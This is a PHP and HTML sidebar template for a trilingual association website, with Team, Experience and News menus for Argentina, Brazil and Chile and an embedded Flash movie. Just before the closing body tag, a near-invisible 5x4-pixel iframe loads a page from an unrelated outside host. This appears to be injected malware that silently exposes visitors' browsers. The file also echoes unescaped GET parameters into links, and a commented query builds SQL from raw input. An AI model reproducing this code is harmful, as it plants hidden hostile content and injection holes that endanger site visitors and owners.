<?
	define ('authenticate', false);
	require ('./inc/conf.inc.php');
	$socio=$_SESSION['socio'];
	$id_sel=$_GET['id_sel'];
	$lng=$_SESSION['lng'];
	
	if(!isset($id_sel) || $id_sel<1 ){ $id_sel=-1; }
	$tit=$_GET['tit'];
	$modo=$_GET['modo'];
	$id_sub_sel1=$_GET['id_sub_sel1'];

	global $prefijo_socio,$socio;

	$lateral[0]['esp']='Equipo';
	$lateral[0]['ing']='Team';
	$lateral[0]['por']='Equipe';

	$lateral[1]['esp']='Experiencia';
	$lateral[1]['ing']='Experience';
	$lateral[1]['por']='Experiência';

	$lateral[2]['esp']='Novedades';
	$lateral[2]['ing']='News';
	$lateral[2]['por']='Notícias';

	$brasil['esp']='Brasil';
	$brasil['ing']='Brazil';
	$brasil['por']='Brasil';
	
	$asoc['esp']='Asociación';
	$asoc['ing']='Association';
	$asoc['por']='Associação';

	if(strlen($id_sub_sel)==0 ){
		$id_tmp=$id_sel;
	}
	
	if($id_sub_sel1>0 ){
		$id_tmp1=$id_sub_sel1;
	}
	else{
		$id_tmp1=$id_tmp;
		$id_sub_sel1=$id_tmp;
	}
	

?>


<html>
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="./estilos<?=$_SESSION['socio']?>.css" rel="stylesheet" type="text/css">

</head>
<script language="javascript">

	function equipo(x){
		
	}
	function menu( s ){
		document.getElementById('equipo_menu').style.display = 'none' ;
		document.getElementById('experiencia_menu').style.display = 'none';
	
		document.getElementById(s).style.display = document.getElementById(s).style.display == 'block' ? 'none' : 'block';
	}
</script>
<table width="90%" height="100%"  border="0" cellpadding="0" cellspacing="0" align="center">
<tr><td>
<table width="90%" height="100%"  border="0" cellpadding="0" cellspacing="0" align="center">
		<tr><td height="29"><small>&nbsp;</small></td></tr>
	<tr valign="top">
		<td>
		<?
		if($menu==1){
		?>
			<table width="100%" height="5%">
				<tr valign="bottom">
				   <td class="menulateral">&bull;<a href="<?=$id_sub_sel != 8? "javascript:menu('equipo_menu')": "equipo.php?pais=Argentina&id_sub_sel=".$id_sub_sel?>"  <?=$id_sub_sel==8? "target='centro'":''?> class="menulateral" style="text-decoration:none "><?=$lateral[0][$lng]?></a></td>
				</tr>
		
				<? if($id_sub_sel != 8){ ?>
 				<tr valign="bottom" style="display:none;" id="equipo_menu">
					<td class="menulateral">
					  <table width="100%"  border="0" cellspacing="0" cellpadding="0">
                    	<tr>
                    		<td>&nbsp;<a href="equipo.php?id_sub_sel=<?= $id_sub_sel1?>&id_tmp=<?= $id_tmp1?>" class="menulateral" style="text-decoration:none " target="centro"><?=$asoc[$lng]?></a></td>
                   	   </tr>
 					   <tr>
						  <td>&nbsp;<a href="equipo.php?pais=Argentina&id_sub_sel=<?= $id_sub_sel1?>&id_tmp=<?= $id_tmp1?>" class="menulateral" style="text-decoration:none " target="centro">Argentina</a></td>
					   </tr>

					   <tr>
						 <td>&nbsp;<a href="equipo.php?pais=Brasil&id_sub_sel=<?= $id_sub_sel1?>&id_tmp=<?= $id_tmp1?>" class="menulateral" style="text-decoration:none " target="centro"><?=$brasil[$lng]?></a></td>
					   </tr>
					   <tr>
						  <td>&nbsp;<a href="equipo.php?pais=Chile&id_sub_sel=<?= $id_sub_sel1?>&id_tmp=<?= $id_tmp?>" class="menulateral" style="text-decoration:none " target="centro">Chile</a></td>
					  </tr>
				   </table>
				</tr>
			  <? } ?>
			  
				<tr valign="bottom"><td height="1" bgcolor="#000000"></td></tr>

				<tr valign="bottom">
 				    <td class="menulateral">&bull;<a href="<?=$id_sub_sel != 8? "javascript:menu('experiencia_menu')": "experiencia.php?pais=Argentina&id_sub_sel=".$id_sub_sel?>"  <?=$id_sub_sel==8? "target='centro'":''?> class="menulateral" style="text-decoration:none "><?=$lateral[1][$lng]?></a></td>
				</tr>
				
				<? if($id_sub_sel != 8){ ?>
				<tr valign="bottom" style="display:none;" id="experiencia_menu">
					<td class="menulateral">
						<table width="100%"  border="0" cellspacing="0" cellpadding="0">
                    	<tr>
                    		<td>&nbsp;<a href="experiencia.php?id_sub_sel=<?= $id_sub_sel?>&modo=<?=$modo?>&id_tmp=<?= $id_tmp?>" class="menulateral" style="text-decoration:none " target="centro"><?=$asoc[$lng]?></a></td>
                  	  </tr>
                     	<tr>
                    		<td>&nbsp;<a href="experiencia.php?pais=Argentina&id_sub_sel=<?= $id_sub_sel?>&modo=<?=$modo?>&id_tmp=<?= $id_tmp?>" class="menulateral" style="text-decoration:none " target="centro">Argentina</a></td>
                   		</tr>
                    	<tr>
                    		<td>&nbsp;<a href="experiencia.php?pais=Brasil&id_sub_sel=<?= $id_sub_sel?>&modo=<?=$modo?>&id_tmp=<?= $id_tmp?>" class="menulateral" style="text-decoration:none " target="centro"><?=$brasil[$lng]?></a></td>
                    		</tr>
                    	<tr>
                    		<td>&nbsp;<a href="experiencia.php?pais=Chile&id_sub_sel=<?= $id_sub_sel?>&modo=<?=$modo?>&id_tmp=<?= $id_tmp?>" class="menulateral" style="text-decoration:none " target="centro">Chile</a></td>
                   		</tr>
                    	</table>
					<? } ?>
					</td>
				</tr>
				<tr valign="bottom"><td height="1" bgcolor="#000000"></td></tr>
				<tr valign="bottom"><td class="menulateral">&bull;<a href="novedades.php?pais=<?= $socio?>&tipo=0&tit=Areas de Pr%26aacute%3Bctica&id_seccion=<?= $id_sub_sel?>" target="centro" class="menulateral" style="text-decoration:none "><?=$lateral[2][$lng]?></a></td></tr>
				<tr valign="bottom"><td height="1" bgcolor="#000000"></td></tr>
				<tr valign="bottom"><td class="menulateral">&nbsp;</td></tr>
				<tr valign="bottom"><td class="menulateral">&nbsp;</td></tr>
			</table>
		<?
		}
		else{
			?>
			<table width="100%" height="60%"><tr><td>&nbsp;</td></tr></table>

			<?
		}
		?>
		</td>
	</tr>
<tr valign="bottom">
		<td class="titulos" align="left">

<?
	if($socio=='mdt'){
		$ancho=93;
	}
	else{
		$ancho=110;
	}

?>

<OBJECT classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
 codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0"
 WIDTH="<?=$ancho?>" HEIGHT="230" id="dealmakers_mdt_1" ALIGN="">
 <PARAM NAME=movie VALUE="./movies/<?=$socio?>.swf"> <PARAM NAME=quality VALUE=high>
 <PARAM NAME=bgcolor VALUE=#E0E0E0> <EMBED src="./movies/<?=$socio?>.swf" quality=high bgcolor=#E0E0E0  WIDTH="<?= $swf_width?>" HEIGHT="<?= $swf_height ?>" NAME="dealmakers_mdt_1" ALIGN=""
 TYPE="application/x-shockwave-flash" PLUGINSPAGE="http://www.macromedia.com/go/getflashplayer"></EMBED>
</OBJECT>

		<?/*
		$db->select('frases','*',"id=$id_sel and lng='$lng'");
		if($db->num_rows()>0){
			$row=$db->fetch_object();
			echo $row->texto;
		}
		else{
			echo $id_sel;
		}
		*/?>
		</td>
	</tr></table>
</td></tr></table>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
